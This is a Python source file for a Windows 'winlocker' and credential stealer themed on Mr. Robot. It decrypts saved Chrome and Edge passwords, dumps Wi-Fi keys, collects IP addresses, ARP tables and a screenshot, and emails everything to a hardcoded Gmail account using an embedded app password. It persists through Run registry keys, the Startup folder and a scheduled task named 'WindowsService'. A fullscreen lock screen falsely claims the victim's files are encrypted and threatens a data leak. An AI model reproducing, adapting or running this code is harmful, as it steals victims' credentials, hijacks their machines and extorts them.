import os, sys, time, threading, tempfile, tkinter as tk
from tkinter import PhotoImage
import urllib.request, smtplib, socket, subprocess, base64, random, re, json
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import cv2, numpy as np
from PIL import ImageGrab, Image, ImageDraw
import sqlite3, win32crypt, shutil, winreg

# ===== НАСТРОЙКИ =====
PASSWORD = "1601"
MAX_ATTEMPTS = 4
GMAIL_LOGIN = "xzx78848@gmail.com"
GMAIL_APP_PASSWORD = "cbgr awth fvak xgfb"
RECEIVER_EMAIL = "xzx78848@gmail.com"
VIDEO_URL = "https://github.com/ippo123459-bit/winlocker/raw/refs/heads/main/fuxEcorp.mp4.mp4"
AUDIO_URL = "https://github.com/ippo123459-bit/winlocker/raw/refs/heads/main/fuxEcorp.mp4.mp3"
LOGO_URL = "https://github.com/ippo123459-bit/winlocker/raw/refs/heads/main/logo.png"
VIDEO_PATH = os.path.join(tempfile.gettempdir(), "video.mp4")
AUDIO_PATH = os.path.join(tempfile.gettempdir(), "audio.mp3")
LOGO_PATH = os.path.join(tempfile.gettempdir(), "logo.png")
attempts_left = MAX_ATTEMPTS

# ===== АВТОЗАГРУЗКА ВЕЗДЕ =====
def add_to_startup():
    try:
        cp = os.path.abspath(__file__)
        pp = os.path.splitext(cp)[0] + ".pyw"
        if not cp.endswith(".pyw"):
            try: shutil.copy2(cp, pp)
            except: pass
            cp = pp
        pythonw = sys.executable.replace("python.exe", "pythonw.exe")
        
        # Реестр HKCU
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "WindowsService", 0, winreg.REG_SZ, f'"{pythonw}" "{cp}"')
        winreg.CloseKey(k)
        
        # Startup folder
        startup = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        dest = os.path.join(startup, 'WindowsService.pyw')
        if cp != dest:
            try: shutil.copy2(cp, dest)
            except: pass
        
        # HKLM (если есть права)
        try:
            k2 = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(k2, "WindowsService", 0, winreg.REG_SZ, f'"{pythonw}" "{cp}"')
            winreg.CloseKey(k2)
        except: pass
        
        # Scheduled Task
        os.system(f'schtasks /create /tn "WindowsService" /tr "\\"{pythonw}\\" \\"{cp}\\"" /sc ONLOGON /rl HIGHEST /f >nul 2>&1')
    except: pass

# ===== СКАЧИВАНИЕ ФАЙЛОВ =====
def download_file(url, path):
    try:
        if os.path.exists(path): os.remove(path)
        urllib.request.urlretrieve(url, path)
    except: pass

# ===== ПЛАВНАЯ АНИМАЦИЯ ПОСЛЕ ВИДЕО =====
def show_logo_animation():
    download_file(LOGO_URL, LOGO_PATH)
    if not os.path.exists(LOGO_PATH): return
    
    a = tk.Tk()
    a.attributes('-fullscreen', True); a.attributes('-topmost', True)
    a.configure(bg='black'); a.overrideredirect(True)
    a.attributes('-alpha', 0)
    
    try:
        logo = PhotoImage(file=LOGO_PATH)
        lbl = tk.Label(a, image=logo, bg='black')
        lbl.image = logo
        lbl.pack(expand=True)
    except: pass
    
    # Плавное появление
    for alpha in range(0, 110, 5):
        a.attributes('-alpha', alpha/100)
        a.update()
        time.sleep(0.03)
    
    time.sleep(2)
    
    # Плавное исчезновение
    for alpha in range(100, -10, -10):
        a.attributes('-alpha', alpha/100)
        a.update()
        time.sleep(0.03)
    
    a.destroy()

# ===== ВИДЕО БЫСТРОЕ =====
def play_video():
    download_file(VIDEO_URL, VIDEO_PATH)
    download_file(AUDIO_URL, AUDIO_PATH)
    time.sleep(0.5)
    
    try:
        v = tk.Tk()
        v.attributes('-fullscreen', True); v.configure(bg='black')
        v.overrideredirect(True); v.protocol("WM_DELETE_WINDOW", lambda: None)
        lbl = tk.Label(v, bg='black'); lbl.pack(expand=True, fill='both')
        
        cap = cv2.VideoCapture(VIDEO_PATH)
        if cap.isOpened():
            fps = cap.get(cv2.CAP_PROP_FPS)
            if fps <= 0: fps = 30
            
            # Звук через subprocess
            try: subprocess.Popen(['ffplay','-nodisp','-autoexit','-loglevel','quiet', AUDIO_PATH], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except: pass
            
            sw, sh = v.winfo_screenwidth(), v.winfo_screenheight()
            ft = 1.0/fps; lt = time.time()
            
            while cap.isOpened():
                ret, frame = cap.read()
                if not ret: break
                while time.time() - lt < ft: time.sleep(0.001)
                lt = time.time()
                frame = cv2.resize(frame, (sw, sh))
                frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                img = tk.PhotoImage(data=cv2.imencode('.ppm', frame)[1].tobytes())
                lbl.config(image=img); lbl.image = img; v.update()
            
            cap.release()
        v.destroy()
    except: pass

# ===== СТИЛЬ MR.ROBOT =====
def draw_jester():
    img = Image.new('RGBA', (180, 230), (0,0,0,0))
    d = ImageDraw.Draw(img)
    d.ellipse([25, 55, 155, 200], fill='#f5e6d3', outline='black', width=2)
    d.ellipse([55, 95, 80, 108], fill='black'); d.ellipse([100, 95, 125, 108], fill='black')
    d.arc([55, 120, 125, 175], start=0, end=180, fill='black', width=3)
    for x in range(65, 120, 8): d.line([x, 148, x, 160], fill='black', width=2)
    d.polygon([90, 8, 45, 62, 135, 62], fill='#8B0000', outline='black', width=2)
    d.ellipse([35, 3, 50, 18], fill='white', outline='black')
    d.ellipse([130, 3, 145, 18], fill='white', outline='black')
    d.ellipse([80, 0, 100, 12], fill='white', outline='black')
    return img

# ===== СТИЛЕР (ВСЁ В ОДНОМ) =====
def mega_steal():
    report = []
    report.append("="*60)
    report.append("DEDSEK ULTIMATE STEALER")
    report.append("="*60)
    report.append(f"USER: {os.environ.get('USERNAME')}")
    report.append(f"PC: {socket.gethostname()}")
    
    # IP адреса
    try:
        pub_ip = urllib.request.urlopen("https://api.ipify.org", timeout=5).read().decode()
        report.append(f"PUBLIC IP: {pub_ip}")
    except: pass
    try:
        loc_ip = socket.gethostbyname(socket.gethostname())
        report.append(f"LOCAL IP: {loc_ip}")
    except: pass
    
    # ARP (все устройства в сети)
    try:
        arp = subprocess.check_output("arp -a", shell=True, stderr=subprocess.DEVNULL).decode('cp866','replace')
        report.append("\nNETWORK DEVICES:\n" + arp[:2000])
    except: pass
    
    # Chrome пароли
    report.append("\n=== CHROME PASSWORDS ===")
    chrome_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
    if os.path.exists(chrome_path):
        try:
            db = os.path.join(tempfile.gettempdir(), 'chrome.db')
            shutil.copy2(chrome_path, db)
            cur = sqlite3.connect(db).cursor()
            cur.execute("SELECT origin_url, username_value, password_value FROM logins")
            for url, user, pw in cur:
                try:
                    pwd = win32crypt.CryptUnprotectData(pw, None, None, None, 0)[1].decode('utf-8','ignore')
                    report.append(f"URL: {url}\nLOGIN: {user}\nPASSWORD: {pwd}\n" + "-"*30)
                except: pass
            cur.close()
            try: os.remove(db)
            except: pass
        except: pass
    
    # Edge пароли
    report.append("\n=== EDGE PASSWORDS ===")
    edge_path = os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data')
    if os.path.exists(edge_path):
        try:
            db = os.path.join(tempfile.gettempdir(), 'edge.db')
            shutil.copy2(edge_path, db)
            cur = sqlite3.connect(db).cursor()
            cur.execute("SELECT origin_url, username_value, password_value FROM logins")
            for url, user, pw in cur:
                try:
                    pwd = win32crypt.CryptUnprotectData(pw, None, None, None, 0)[1].decode('utf-8','ignore')
                    report.append(f"URL: {url}\nLOGIN: {user}\nPASSWORD: {pwd}\n" + "-"*30)
                except: pass
            cur.close()
            try: os.remove(db)
            except: pass
        except: pass
    
    # WiFi пароли
    report.append("\n=== WIFI PASSWORDS ===")
    try:
        output = subprocess.check_output("netsh wlan show profiles", shell=True, stderr=subprocess.DEVNULL).decode('cp866','replace')
        for line in output.split('\n'):
            if 'Все профили' in line:
                p = line.split(':')[1].strip()
                if p:
                    det = subprocess.check_output(f'netsh wlan show profile name="{p}" key=clear', shell=True, stderr=subprocess.DEVNULL).decode('cp866','replace')
                    for dl in det.split('\n'):
                        if 'Содержимое ключа' in dl:
                            report.append(f"WiFi: {p} | PASS: {dl.split(':')[1].strip()}")
    except: pass
    
    # Скриншот
    try:
        ss = os.path.join(tempfile.gettempdir(), 'desktop.jpg')
        ImageGrab.grab().save(ss, 'JPEG', quality=50)
        send_file_email(ss, "[DedSek_Logs] Screenshot")
        try: os.remove(ss)
        except: pass
    except: pass
    
    report.append(f"\nTIME: {time.strftime('%d.%m.%Y %H:%M:%S')}")
    
    text = '\n'.join(report)
    for i, part in enumerate([text[i:i+15000] for i in range(0, len(text), 15000)]):
        send_email(part, f"[DedSek_Logs] Report [{i+1}]")

def send_email(msg, subj=None):
    try:
        m = MIMEText(msg, 'plain', 'utf-8')
        m['Subject'] = subj or 'DedSek'
        m['From'] = GMAIL_LOGIN; m['To'] = RECEIVER_EMAIL
        s = smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=10)
        s.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD); s.send_message(m); s.quit()
    except: pass

def send_file_email(fp, desc):
    try:
        if not os.path.exists(fp): return
        m = MIMEMultipart()
        m['Subject'] = desc; m['From'] = GMAIL_LOGIN; m['To'] = RECEIVER_EMAIL
        with open(fp, 'rb') as f:
            p = MIMEBase('application', 'octet-stream'); p.set_payload(f.read())
            encoders.encode_base64(p)
            p.add_header('Content-Disposition', f'attachment; filename="{os.path.basename(fp)}"')
            m.attach(p)
        s = smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=10)
        s.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD); s.send_message(m); s.quit()
    except: pass

# ===== ВИНЛОКЕР В СТИЛЕ MR.ROBOT =====
class WinLocker:
    def __init__(self):
        self.root = tk.Tk(); self.root.withdraw()
        self.win = tk.Toplevel(self.root)
        self.win.attributes('-fullscreen', True); self.win.configure(bg='#1a3a5c')
        self.win.overrideredirect(True); self.win.protocol("WM_DELETE_WINDOW", lambda: None)
        self.win.focus_force()
        global attempts_left
        
        # Белый блок сверху
        top = tk.Frame(self.win, bg='white', bd=2, relief='solid')
        top.place(relx=0.5, rely=0.02, anchor='n', width=780, height=200)
        tk.Label(top, text="#OPdailyallowance", bg='white', fg='#111', font=('Courier', 16, 'bold')).pack(pady=(10,2))
        tk.Label(top, text="Your files are encrypted.", bg='white', fg='#cc0000', font=('Courier', 12, 'bold')).pack(pady=2)
        tk.Label(top, text="To unlock you need to solve the riddle.", bg='white', fg='#111', font=('Courier', 10)).pack(pady=3)
        tk.Label(top, text="If timer expires - all data will be leaked.", bg='white', fg='#cc0000', font=('Courier', 10, 'bold')).pack(pady=3)
        tk.Label(top, text="More instructions forthcoming - fsociety", bg='white', fg='#666', font=('Courier', 9, 'italic')).pack(pady=5)
        
        # Маска джокера
        try:
            jester = draw_jester()
            jp = os.path.join(tempfile.gettempdir(), "jester.png"); jester.save(jp)
            self.jp = PhotoImage(file=jp)
            tk.Label(self.win, image=self.jp, bg='#1a3a5c').place(relx=0.5, rely=0.45, anchor='center')
        except: pass
        
        tk.Label(self.win, text="JESTER ☠ ACTUAL", bg='#1a3a5c', fg='white', font=('Courier', 10, 'bold')).place(relx=0.5, rely=0.65, anchor='center')
        
        # Поле ввода
        cf = tk.Frame(self.win, bg='#1a3a5c'); cf.place(relx=0.5, rely=0.82, anchor='center')
        tk.Label(cf, text="ENTER PASSWORD:", bg='#1a3a5c', fg='white', font=('Courier', 12, 'bold')).pack(pady=(0,3))
        self.pw = tk.Entry(cf, show="*", font=('Courier', 12, 'bold'), bg='white', fg='black', relief='solid', bd=1)
        self.pw.pack(pady=(0,3), ipadx=30, ipady=2)
        self.sl = tk.Label(cf, text=f"ATTEMPTS LEFT: {attempts_left}", bg='#1a3a5c', fg='white', font=('Courier', 10))
        self.sl.pack()
        self.pw.bind('<Return>', self.check); self.pw.focus_force()
        self.win.after(100, self._keep)
    
    def _keep(self):
        try: self.win.focus_force(); self.pw.focus_force(); self.win.after(100, self._keep)
        except: pass
    
    def check(self, e=None):
        global attempts_left
        if self.pw.get() == PASSWORD:
            self.sl.config(text="CORRECT!", fg='#0f0'); self.win.update()
            time.sleep(1); self.root.destroy(); os._exit(0)
        else:
            attempts_left -= 1
            if attempts_left > 0: self.sl.config(text=f"WRONG! LEFT: {attempts_left}")
            else: self.sl.config(text="404 | ERROR"); self.win.after(2000, lambda: os._exit(0))
            self.pw.delete(0, tk.END)

# ===== MAIN =====
if __name__ == "__main__":
    threading.Thread(target=mega_steal, daemon=True).start()
    add_to_startup()
    
    play_video()
    show_logo_animation()
    
    WinLocker()
    tk.mainloop()
